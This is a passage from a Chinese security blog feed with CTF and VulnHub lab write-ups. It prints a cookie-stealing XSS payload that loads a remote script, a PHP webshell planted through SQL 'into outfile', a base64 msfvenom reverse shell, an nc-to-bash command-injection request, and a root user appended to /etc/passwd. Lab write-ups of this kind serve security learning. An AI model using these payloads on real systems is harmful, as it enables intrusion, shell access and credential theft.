class="line">    <span class="keyword">return</span> temp.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">res</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(i)[:<span class="number">6</span>] == res:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    u = requests.session()</span><br><span class="line">    r = u.get(<span class="string">&#x27;http://139.199.223.182:2000/admin.php&#x27;</span>)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    code = re.findall(<span class="string">r&quot;, 0, 6\) === “([^”]+)”&quot;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">    check = calc(code)</span><br><span class="line">    post = <span class="built_in">input</span>(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">    data = &#123;<span class="string">&#x27;post&#x27;</span> : post, <span class="string">&#x27;check&#x27;</span> : check&#125;</span><br><span class="line">    r = u.post(<span class="string">&#x27;http://139.199.223.182:2000/admin.php&#x27;</span>, data = data)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    res = re.findall(<span class="string">&#x27;你的文章发表在了 \.([^&lt;]+)&lt;/div&gt;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">    r = u.get(<span class="string">&#x27;http://139.199.223.182:2000&#x27;</span> + res)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>提交一下实体字符,发现没过滤,那用实体xss就ok xss平台上面新建一个项目,然后提交eval部分 样例payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=eval(atob(&#x27;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL3BhWmlzaj8nK01hdGgucmFuZG9tKCk=&#x27;))&gt;</span><br></pre></td></tr></table></figure><p>中间的base64换成自己的payload 然后在cookie拿到flag</p><h2 id="whitebox-or-blackbox">WhiteBox or BlackBox?</h2><p>suctf原题...参考链接:<a href="http://localhost/2018/07/28/suctf%E8%A1%A5%E9%A2%98/" title="http://localhost/2018/07/28/suctf%E8%A1%A5%E9%A2%98/">http://localhost/2018/07/28/suctf%E8%A1%A5%E9%A2%98/</a> 解析可以参考我suctf的文章,也可以自己找其他师傅的文章 这里我还是用二次注入做的 注册</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">帐号:<span class="meta">&lt;?=</span>`<span class="variable">$_POST</span>[d]`;<span class="meta">?&gt;</span></span><br><span class="line">密码:随意</span><br></pre></td></tr></table></figure><p>自动登录之后注销掉 然后注册一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">帐号:<span class="meta">&lt;?=</span>`<span class="variable">$_POST</span>[e]`;<span class="meta">?&gt;</span><span class="string">&#x27;into outfile&#x27;</span>/<span class="keyword">var</span>/www/html/favicon/<span class="number">4</span>.php</span><br><span class="line">密码:随意</span><br></pre></td></tr></table></figure><p>自动登录之后注销然后再登录,查看用户信息,语句得到执行 <a href="/images/2018/09/QQ截图20181013021854.jpg"><img src="/images/2018/09/QQ截图20181013021854.jpg" /></a> 这个时候已经写好了shell,直接跑就ok 用的前面学的短括号返回信息,可以回显命令执行 <a href="/images/2018/09/QQ截图20181013022143.jpg"><img src="/images/2018/09/QQ截图20181013022143.jpg" /></a> 根目录拿到flag <a href="/images/2018/09/QQ截图20181013022305.jpg"><img src="/images/2018/09/QQ截图20181013022305.jpg" /></a></p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透学习(node1)</title>
      <link href="/2018/09/18/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0node1/"/>
      <url>/2018/09/18/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0node1/</url>
      
        <content type="html"><![CDATA[<h1 id="node1">node1</h1><h2 id="靶机下载和介绍">靶机下载和介绍</h2><p><a href="https://www.vulnhub.com/entry/node-1,252/" title="https://www.vulnhub.com/entry/node-1,252/">https://www.vulnhub.com/entry/node-1,252/</a></p><h2 id="ip和端口信息">ip和端口信息</h2><p>靶机ip:172.20.10.2<br />扫描信息<br /><img src="/images/2018/09/2018-09-18-09-09-19屏幕截图.png" /></p><h2 id="web服务">web服务</h2><p>访问一下主页面,抓一下数据包,发现一个xhr,里面包含密码<br /><img src="/images/2018/09/2018-09-18-09-24-27屏幕截图.png" /> cmd5解一下<br /><img src="/images/2018/09/2018-09-18-09-26-46屏幕截图.png" alt="&quot;blacsheep&quot;" /> 登录上去之后发现并没有什么有用的信息<br /><img src="/images/2018/09/2018-09-18-09-28-26屏幕截图.png" alt="&quot;blacsheep&quot;" /> 无意中删掉lateset,访问<code>http://172.20.10.2:3000/api/users</code> 发现得到了数据库里的全部用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;_id&quot;:&quot;59a7365b98aa325cc03ee51c&quot;,&quot;username&quot;:&quot;myP14ceAdm1nAcc0uNT&quot;,&quot;password&quot;:&quot;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&quot;,&quot;is_admin&quot;:true&#125;,&#123;&quot;_id&quot;:&quot;59a7368398aa325cc03ee51d&quot;,&quot;username&quot;:&quot;tom&quot;,&quot;password&quot;:&quot;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&quot;,&quot;is_admin&quot;:false&#125;,&#123;&quot;_id&quot;:&quot;59a7368e98aa325cc03ee51e&quot;,&quot;username&quot;:&quot;mark&quot;,&quot;password&quot;:&quot;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&quot;,&quot;is_admin&quot;:false&#125;,&#123;&quot;_id&quot;:&quot;59aa9781cced6f1d1490fce9&quot;,&quot;username&quot;:&quot;rastating&quot;,&quot;password&quot;:&quot;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&quot;,&quot;is_admin&quot;:false&#125;]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用管理员帐号登录,发现可以下载backup文件<br /><img src="/images/2018/09/2018-09-18-09-31-58屏幕截图.png" alt="&quot;blacsheep&quot;" /> 看一下发现是base64,解一下<br /><img src="/images/2018/09/2018-09-18-09-34-13屏幕截图.png" alt="&quot;blacsheep&quot;" /> 发现解密之后是个压缩包,但是有密码,试了一些密码发现不太对,用kali默认的rockyou试了一下,拿到密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:~/Desktop$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace_decode.bak</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == magicword</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>unzip下来,看主要部分app.js,大概看了下源码,并没有发现漏洞,但是有一个mongodb的密码 <img src="/images/2018/09/2018-09-18-09-40-40屏幕截图.png" alt="&quot;blacsheep&quot;" /> 想到之前开了ssh,连一下,拿到了mark用户的shell <img src="/images/2018/09/2018-09-18-09-44-02屏幕截图.png" alt="&quot;blacsheep&quot;" /></p><h2 id="提权">提权</h2><p><code>sudo -l</code>发现不是sudoer,/etc/passwd不可写,也没有显示的密码,查找了一下各用户的文件也没有突破口... scp传一下探测脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r /home/blacsheep/Tools/MyWebTools mark@172.20.10.2:/tmp/</span><br></pre></td></tr></table></figure><p>开始的时候拿脏牛打了一下,发现失败了,换了个18年的ubuntu16.04的exp打过去 <img src="/images/2018/09/2018-09-18-09-55-56屏幕截图.png" alt="&quot;blacsheep&quot;" /> 拿到root</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透学习(wakanda,bulldog2)</title>
      <link href="/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/"/>
      <url>/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/</url>
      
        <content type="html"><![CDATA[<h1 id="wakanda1">wakanda:1</h1><h2 id="安装和介绍">安装和介绍</h2><p><a href="https://www.vulnhub.com/entry/wakanda-1,251/" title="https://www.vulnhub.com/entry/wakanda-1,251/">https://www.vulnhub.com/entry/wakanda-1,251/</a></p><h2 id="ip和端口">ip和端口</h2><p>靶机ip:192.168.1.102 端口信息 <img src="/images/2018/09/2018-09-16-21-21-17屏幕截图.png" alt="blacsheep" /></p><h2 id="拿shell">拿shell</h2><p>去80端口看下,发现没有可以响应的网页 <img src="/images/2018/09/2018-09-16-21-22-33屏幕截图.png" alt="blacsheep" /> dirb扫一下 <img src="/images/2018/09/2018-09-16-21-24-05屏幕截图.png" alt="blacsheep" /> 可以看到size都是0,没突破口 再回去看网页源码的时候发现有一行注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</span><br></pre></td></tr></table></figure><p>我们访问一下,发现页面不一样 <img src="/images/2018/09/2018-09-16-21-25-51屏幕截图.png" alt="blacsheep" /> 猜测存在文件包含,去看下有没有fr.php,发现存在 <img src="/images/2018/09/2018-09-16-21-27-11屏幕截图.png" alt="blacsheep" /> 试试文件包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/blacsheep# curl &quot;http://192.168.1.102/?lang=php://filter/read=convert.base64-encode/resource=index&quot;  base64 -d</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  3815  100  3815    0     0  3725k      0 --:--:-- --:--:-- --:--:-- 3725k</span><br><span class="line">&lt;?php</span><br><span class="line">$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember it</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;lang&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">include($_GET[&#x27;lang&#x27;].&quot;.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Vibranium Market&lt;/title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body class=&quot;text-center&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;</span><br><span class="line">      &lt;header class=&quot;masthead mb-auto&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">          &lt;h3 class=&quot;masthead-brand&quot;&gt;Vibranium Market&lt;/h3&gt;</span><br><span class="line">          &lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&gt;</span><br><span class="line">            &lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;</span><br><span class="line">            &lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</span><br><span class="line">          &lt;/nav&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line"></span><br><span class="line">      &lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&gt;</span><br><span class="line">        &lt;h1 class=&quot;cover-heading&quot;&gt;Coming soon&lt;/h1&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">          &lt;?php</span><br><span class="line">            if (isset($_GET[&#x27;lang&#x27;]))</span><br><span class="line">          &#123;</span><br><span class="line">          echo $message;</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            ?&gt;</span><br><span class="line"></span><br><span class="line">            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!</span><br><span class="line">            &lt;?php</span><br><span class="line">          &#125;</span><br><span class="line">?&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">          &lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&gt;Learn more&lt;/a&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">      &lt;/main&gt;</span><br><span class="line"></span><br><span class="line">      &lt;footer class=&quot;mastfoot mt-auto&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">          &lt;p&gt;Made by&lt;a href=&quot;#&quot;&gt;@mamadou&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/footer&gt;</span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>找到一个密码,去试试ssh 帐号可以用之前页面上的mamadou <img src="/images/2018/09/2018-09-16-21-33-22屏幕截图.png" alt="blacsheep" /> 然后连上去了 <img src="/images/2018/09/2018-09-16-21-34-22屏幕截图.png" alt="blacsheep" /> 权限是mamadou <img src="/images/2018/09/2018-09-16-21-36-51屏幕截图.png" alt="blacsheep" /></p><h2 id="提权">提权</h2><p>先<code>sudo -l</code>一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:~$ sudo -l</span><br><span class="line">[sudo] password for mamadou: </span><br><span class="line">Sorry, user mamadou may not run sudo on Wakanda1.</span><br></pre></td></tr></table></figure><p>帐号没有sudo的权限 找一下线索,读/etc/passwd发现一个devops用户 找下这个用户的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:~$ find / -user devops 2&gt;/dev/null</span><br><span class="line">/srv/.antivirus.py</span><br></pre></td></tr></table></figure><p>发现一个py文件,看下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;/tmp/test&#x27;,&#x27;w&#x27;).write(&#x27;test&#x27;)</span><br></pre></td></tr></table></figure><p>猜测是开机运行的脚本,那么看下权限能不能对文件进行修改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/srv$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root   root      4096 Aug  1 17:52 .</span><br><span class="line">drwxr-xr-x 22 root   root      4096 Aug  1 13:05 ..</span><br><span class="line">-rw-r--rw-  1 devops developer  446 Sep 16 08:41 .antivirus.py</span><br></pre></td></tr></table></figure><p>发现其他用户有写权限,那么直接写进木马,用msfvenom生成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/blacsheep# msfvenom -p cmd/unix/reverse_python lhost=192.168.1.105 lport=4445 R</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload</span><br><span class="line">[-] No arch selected, selecting arch: cmd from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 497 bytes</span><br><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCAgICwgIHN1YnByb2Nlc3MgICAsICBvcyAgICAgOyAgICAgaG9zdD0iMTkyLjE2OC4xLjEwNSIgICAgIDsgICAgIHBvcnQ9NDQ0NSAgICAgOyAgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgLCAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICAgOyAgICAgcy5jb25uZWN0KChob3N0ICAgLCAgcG9ydCkpICAgICA7ICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsICAwKSAgICAgOyAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAgMSkgICAgIDsgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgIDIpICAgICA7ICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure><p>然后把exec的部分写进去 <img src="/images/2018/09/2018-09-16-22-04-09屏幕截图.png" alt="blacsheep" /> 本地监听然后靶机重启 <img src="/images/2018/09/2018-09-16-22-06-12屏幕截图.png" alt="blacsheep" /> 拿到devops权限,然后<code>sudo -l</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">devops@Wakanda1:/$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for devops on Wakanda1:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User devops may run the following commands on Wakanda1:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/pip</span><br></pre></td></tr></table></figure><p>发现可以root执行pip,这里有个trick,有个叫做Fakepip的东西可以反弹shell,github:<a href="https://github.com/0x00-0x00/FakePip" title="https://github.com/0x00-0x00/FakePip">https://github.com/0x00-0x00/FakePip</a> glone下来之后改一下ip,然后写个webshell方便传文件,我们这里写到/tmp下面 <img src="/images/2018/09/2018-09-16-22-10-55屏幕截图.png" alt="blacsheep" /> 然后监听好,devops执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/pip install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure><p><img src="/images/2018/09/2018-09-16-22-12-44屏幕截图.png" alt="blacsheep" /> 反弹的shell在443收到 <img src="/images/2018/09/2018-09-16-22-14-22屏幕截图.png" alt="blacsheep" /></p><h1 id="bulldog2">bulldog2</h1><h2 id="介绍和下载">介绍和下载</h2><p><a href="https://www.vulnhub.com/entry/bulldog-2,246/" title="https://www.vulnhub.com/entry/bulldog-2,246/">https://www.vulnhub.com/entry/bulldog-2,246/</a></p><h2 id="ip和端口-1">ip和端口</h2><p>靶机ip:192.168.43.121 扫端口 <img src="/images/2018/09/2018-09-17-14-51-00屏幕截图.png" alt="blacsheep" /> 只开了80端口</p><h2 id="进一步信息收集">进一步信息收集</h2><p>只开了80,那我们去80端口看下 <img src="/images/2018/09/2018-09-17-14-52-46屏幕截图.png" alt="blacsheep" /> 测试一下,发现几乎没什么功能,注册也关闭了 后来去一个用户信息页面的时候尝试注入,结果得到了错误回显 访问页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.121/profile/lrberna%df&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/2018/09/2018-09-17-14-54-51屏幕截图.png" alt="blacsheep" /> 发现是nodejs,然后发现web目录中的关键词<code>Bulldog-2-The-Reckoning</code> 我们去github搜一下 然后找到原仓库<a href="https://github.com/Frichetten/Bulldog-2-The-Reckoning" title="https://github.com/Frichetten/Bulldog-2-The-Reckoning">https://github.com/Frichetten/Bulldog-2-The-Reckoning</a> <img src="/images/2018/09/2018-09-17-14-56-22屏幕截图.png" alt="blacsheep" /> 开始代码审计</p><h2 id="getshell">getshell</h2><p>看web代码还是习惯先看router,方便了解网站的功能 一打开router就发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const &#123;exec&#125; = require(&#x27;child_process&#x27;);</span><br></pre></td></tr></table></figure><p>ctrl+f搜一下,发现关键代码 <img src="/images/2018/09/2018-09-17-14-58-42屏幕截图.png" alt="blacsheep" /> 即在<code>/linkauthenticate</code>页面存在一个任意代码执行漏洞 burp抓下包,改post和路径,带上命令注入的信息,注意带上<code>Content-type: application/json</code> 我们ping一下,本机<code>tcpdump -nni wlan0 icmp</code> <img src="/images/2018/09/2018-09-17-15-08-55屏幕截图.png" alt="blacsheep" /> 得到回显,本来这里应该直接反弹shell的,但是不知道为什么反弹不了,猜测是字符的问题,所以换了个方式,我们payload里面让nc获得的信息用管道符转到bash,然后在nc里面让它执行反弹shell的命令,最后我们的数据包如下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/users/linkauthenticate</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.43.121</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/json;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>W/&quot;465-1649e73083e&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Sun, 15 Jul 2018 14:58:16 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>77</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json"> <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json"> <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;;nc 192.168.43.245 6712  /bin/bash&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>然后拿到shell <img src="/images/2018/09/2018-09-17-15-14-09屏幕截图.png" alt="blacsheep" /></p><h2 id="提权-1">提权</h2><p>没有用户的密码,但是我们可以看下本机有没有什么配置问题导致可以提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">node@bulldog2:/var/www/node/Bulldog-2-The-Reckoning$ ls -l /etc  grep passwd</span><br><span class="line">ls -l /etc  grep passwd</span><br><span class="line">-rwxrwxrwx 1 root root       1728 Sep 17 04:46 passwd</span><br><span class="line">-rw-r--r-- 1 root root       1650 Jul 15 04:06 passwd-</span><br></pre></td></tr></table></figure><p>发现passwd是可写的,那么我们直接写入一个新的用户就可以了 用openssl生成密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ode@bulldog2:/var/www/node/Bulldog-2-The-Reckoning$ openssl passwd -1 -salt cnss blacsheep</span><br><span class="line">s blacsheepswd -1 -salt cnss</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1$cnss<span class="variable">$LUsyAIs8qkoK</span>/EBDFmYs61</span></span><br></pre></td></tr></table></figure><p>构造一个新的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacsheep:$1$cnss$LUsyAIs8qkoK/EBDFmYs61:0:0:,,,:/home/node:/bin/bash</span><br></pre></td></tr></table></figure><p>然后echo到passwd里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;blacsheep:\$1\$cnss\$LUsyAIs8qkoK/EBDFmYs61:0:0:,,,:/home/node:/bin/bash&quot;&gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure><p>注意这里的\$转义一下 然后就拿到root了 <img src="/images/2018/09/2018-09-17-15-29-03屏幕截图.png" alt="blacsheep" /></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透学习(Cyberry,lampiao)</title>
      <link href="/2018/09/15/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0cyberry/"/>
      <url>/2018/09/15/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0cyberry/</url>
      
